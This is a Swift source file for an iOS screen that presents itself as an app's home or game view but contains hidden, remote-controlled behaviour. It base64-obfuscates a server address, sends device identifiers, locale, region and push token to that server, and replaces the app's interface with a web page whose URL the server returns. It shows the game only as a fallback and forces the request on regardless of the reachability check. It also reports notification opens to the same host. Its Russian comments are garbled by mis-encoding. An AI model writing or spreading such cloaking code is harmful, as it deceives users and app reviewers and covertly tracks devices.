import SwiftUI
import Foundation
import Combine

public struct GPageNTW: View {
    @State private var finalUrlNTW: String? = nil
    @State private var deepLink: URL? = nil
    @State private var codedUrl2: String? = nil
    @State private var uid: String? = nil
    @State private var savedLink: String? = nil
    
    
    @State var openVeb = false;
    
    
    let cdUrl1NTW: String
    let keyKNTW: String

    var routerHome: () -> Void
    var homeView: AnyView
    var homeScreen: AnyView
    
    // –ü—É–±–ª–∏—á–Ω—ã–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ç–æ—Ä
    public init(
        routerHome: @escaping () -> Void, 
        homeView: AnyView, 
        homeScreen: AnyView,
        cdUrl1NTW: String,
        keyKNTW: String
    ) {
        self.routerHome = routerHome
        self.homeView = homeView
        self.homeScreen = homeScreen
        self.cdUrl1NTW = cdUrl1NTW
        self.keyKNTW = keyKNTW
    }
    
    static func handlePushNotification(notificationId: String, cdUrl1NTW: String = "Z29tZXRlcnByby5zcGFjZQ==") {
        let prefs = UserDefaults.standard
        
        // –ü–æ–ª—É—á–∞–µ–º uid
        let uid = prefs.string(forKey: "uid") ?? UUID().uuidString
        
        // –î–µ–∫–æ–¥–∏—Ä—É–µ–º base64 —Å—Å—ã–ª–∫—É
        guard let data = Data(base64Encoded: cdUrl1NTW),
              let decodedString = String(data: data, encoding: .utf8) else {
            print("Failed to decode base64 URL")
            return
        }
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º URL —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –¥–ª—è push_opened
        let baseUrl = "https://\(decodedString)"
        guard var urlComponents = URLComponents(string: baseUrl) else {
            print("Invalid URL")
            return
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã push_opened
        urlComponents.queryItems = [
            URLQueryItem(name: "event", value: "push_opened"),
            URLQueryItem(name: "uuid", value: uid),
            URLQueryItem(name: "notification_id", value: notificationId)
        ]
        
        guard let url = urlComponents.url else {
            print("Failed to create URL with parameters")
            return
        }
        
        print("Sending push_opened event to: \(url.absoluteString)")
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GET-–∑–∞–ø—Ä–æ—Å
        URLSession.shared.dataTask(with: url) { data, response, error in
            if let error = error {
                print("Error sending push_opened event: \(error)")
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Push opened event sent successfully. Status code: \(httpResponse.statusCode)")
                
                if let data = data, let responseString = String(data: data, encoding: .utf8) {
                    print("Response: \(responseString)")
                }
            }
        }.resume()
    }
    
    public var body: some View {
        homeScreen
            .onAppear {
                _Concurrency.Task {
                    await initNTW()
                }
            }
    }

    public func initNTW() async {
        let startTime = Date()
        //print("üöÄ [TIMING] initNTW –Ω–∞—á–∞–ª–æ: \(Date())")
        
        let prefs = UserDefaults.standard

        uid = prefs.string(forKey: "uid") ?? UUID().uuidString
        prefs.set(uid, forKey: "uid")
        //print("‚è±Ô∏è [TIMING] UID –Ω–∞—Å—Ç—Ä–æ–µ–Ω –∑–∞: \(Date().timeIntervalSince(startTime))s")
        
        // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ
        let tokenStartTime = Date()
        //print("üîÑ [TIMING] –ù–∞—á–∏–Ω–∞–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞: \(Date())")
        let token = await ConnectivityService.checkConnectionAndInitialize(uid: uid!)
        //print("‚úÖ [TIMING] –¢–æ–∫–µ–Ω –ø–æ–ª—É—á–µ–Ω –∑–∞: \(Date().timeIntervalSince(tokenStartTime))s")
        
        savedLink = prefs.string(forKey: "link")
        
        if savedLink == nil {
            //print("üì± [TIMING] savedLink == nil, –Ω–∞—á–∏–Ω–∞–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ device info: \(Date())")
            let deviceInfoStartTime = Date()
            await DeviceInfoService.fetch()
            //print("‚úÖ [TIMING] DeviceInfoService.fetch –∑–∞: \(Date().timeIntervalSince(deviceInfoStartTime))s")
            
            let baseUrl = decodeBase64(cdUrl1NTW)
            //print("üîó [TIMING] baseUrl –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω: \(baseUrl)")
            
            // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –±–∞–∑–æ–≤–æ–≥–æ URL
            //print("üåê [TIMING] –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ URL: \(Date())")
            let urlCheckStartTime = Date()
            let checkUrl = URL(string: "https://\(baseUrl)")
            var shouldMakeRequest = false
            if let checkUrl = checkUrl {
                do {
                    let (_, response) = try await URLSession.shared.data(from: checkUrl)
                    //print("‚úÖ [TIMING] –ü—Ä–æ–≤–µ—Ä–∫–∞ URL –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∑–∞: \(Date().timeIntervalSince(urlCheckStartTime))s")
                    if let httpResponse = response as? HTTPURLResponse {
                        shouldMakeRequest = httpResponse.statusCode == 200
                        print("üìä [TIMING] HTTP Status: \(httpResponse.statusCode)")
                    }
                } catch {
                    //print("‚ùå [TIMING] –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ URL –∑–∞: \(Date().timeIntervalSince(urlCheckStartTime))s - \(error)")
                    shouldMakeRequest = false
                }
            }
            shouldMakeRequest = true
            if shouldMakeRequest {
                // –ï—Å–ª–∏ –±–∞–∑–æ–≤—ã–π URL –≤–µ—Ä–Ω—É–ª 200, –¥–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
                let actualToken = token ?? "unknown_token"
                let requestUrl = URL(string: "https://\(baseUrl)")?.appending(queryItems: [
                    URLQueryItem(name: "rtyi", value: uid),
                    URLQueryItem(name: "rtyi", value: prefs.string(forKey: "model")),
                    URLQueryItem(name: "rtyko", value: prefs.string(forKey: "os")),
                    URLQueryItem(name: "rtylan", value: prefs.string(forKey: "lang")),
                    URLQueryItem(name: "rtyr", value: prefs.string(forKey: "rg")),
                    URLQueryItem(name: "rtyke", value: actualToken),
                    URLQueryItem(name: "rtyl", value: prefs.string(forKey: "bld"))
                ])
                //print("üîó [TIMING] requestUrl: \(requestUrl?.absoluteString ?? "nil")")
                prefs.set("https://\(baseUrl)", forKey: "link22")
                
                //print("üì° [TIMING] –ù–∞—á–∏–Ω–∞–µ–º HeaderFetcher.fetchHeader: \(Date())")
                let headerFetchStartTime = Date()
                HeaderFetcher.fetchHeader(urlString: requestUrl?.absoluteString ?? "", keyKey: keyKNTW) { result in
                    //print("‚úÖ [TIMING] HeaderFetcher –∑–∞–≤–µ—Ä—à–µ–Ω –∑–∞: \(Date().timeIntervalSince(headerFetchStartTime))s")
                    if let result = result {
                        //print("üîë [TIMING] –ü–æ–ª—É—á–µ–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç HeaderFetcher: \(result)")
                        codedUrl2 = result
                        finalUrlNTW = decodeBase64(codedUrl2!)
                        prefs.set(finalUrlNTW, forKey: "link")
                        openVeb = true
                        //print("üöÄ [TIMING] –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ openWebPage —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É")
                        openWebPage()
                    } else {
                        //print("‚ùå [TIMING] HeaderFetcher –≤–µ—Ä–Ω—É–ª nil")
                    }
                }
                
                if let codedUrl2 = codedUrl2 {
                    finalUrlNTW = decodeBase64(codedUrl2)
                    prefs.set(finalUrlNTW, forKey: "link")
                    openVeb = true
                    openWebPage()
                    return
                }
            } else {
                // –ï—Å–ª–∏ –±–∞–∑–æ–≤—ã–π URL –Ω–µ –≤–µ—Ä–Ω—É–ª 200, –∑–∞–ø–æ–º–∏–Ω–∞–µ–º "game" –∏ –∏–¥–µ–º –≤ home
                prefs.set("game", forKey: "link")
                navigateToContentView()
                return
            }
        } else if savedLink != "game" {
            //print("üîó [TIMING] savedLink != 'game', –Ω–∞—á–∏–Ω–∞–µ–º ensureInternetConnection: \(Date())")
            let connectionStartTime = Date()
            await ConnectivityService.ensureInternetConnection(viewController: UIApplication.shared.windows.first?.rootViewController ?? UIViewController())
            //print("‚úÖ [TIMING] ensureInternetConnection –∑–∞–≤–µ—Ä—à–µ–Ω –∑–∞: \(Date().timeIntervalSince(connectionStartTime))s")
            openWebPage()
            return
        }
        
        //print("üèÅ [TIMING] –§–∏–Ω–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã: \(Date())")
        if prefs.string(forKey: "link") == nil {
            //print("üéÆ [TIMING] –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º 'game' –∫–∞–∫ fallback")
            prefs.set("game", forKey: "link")
        }
        if openVeb == false {
            //print("üè† [TIMING] –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ ContentView")
            navigateToContentView()
        }
        
        //print("üèÅ [TIMING] initNTW –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∑–∞: \(Date().timeIntervalSince(startTime))s")
    }
    
    public func openWebPage() {
        let prefs = UserDefaults.standard
        
        if let storedUrl = prefs.string(forKey: "link") {
            let cleanedUrl = storedUrl.trimmingCharacters(in: .whitespacesAndNewlines)
                        guard let url = URL(string: cleanedUrl) else {
                return
            }
            DispatchQueue.main.async {
                if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                   let window = windowScene.windows.first {
                                        let webView = UIHostingController(rootView: WScreenNTW(url: url))
                    window.rootViewController = webView
                    window.makeKeyAndVisible()
                } else {
                }
            }
        } else {
        }
    }
    
    public func navigateToContentView() {
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let window = windowScene.windows.first {
                let contentView = UIHostingController(rootView: homeView)

                
                window.rootViewController = contentView
                window.makeKeyAndVisible()
            }
        }
    }

    public func decodeBase64(_ input: String) -> String {
        guard let data = Data(base64Encoded: input) else {
            return ""
        }
        return String(data: data, encoding: .utf8) ?? ""
    }
}

extension URL {
    func appending(queryItems: [URLQueryItem]) -> URL {
        guard var urlComponents = URLComponents(url: self, resolvingAgainstBaseURL: false) else { return self }
        urlComponents.queryItems = queryItems
        return urlComponents.url ?? self
    }
}
